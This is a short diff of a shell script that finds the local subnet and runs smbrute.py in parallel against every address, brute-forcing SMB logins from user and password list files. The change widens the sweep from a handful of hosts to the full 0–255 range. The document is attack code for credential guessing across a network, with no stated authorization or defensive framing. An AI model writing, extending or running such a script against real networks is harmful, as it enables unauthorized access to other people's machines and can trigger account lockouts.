@@ -35,7 +35,7 @@ echo YourWinPassword >> pass.txt
 subn=$(ip addr | grep -Po '(?!(inet 127.\d.\d.1))(inet \K(\d{1,3}\.){3}\d{1,3})' | sed 's/\.[0-9]*$/.0/')/24
 subnet=${subn::-4}
 
-for addr in `seq 0 1 6 `; do
+for addr in `seq 0 1 255 `; do
 ( python3.7 smbrute.py -h $subnet$addr -U users.txt -P pass.txt >> smbrute.log ) &
 done
 
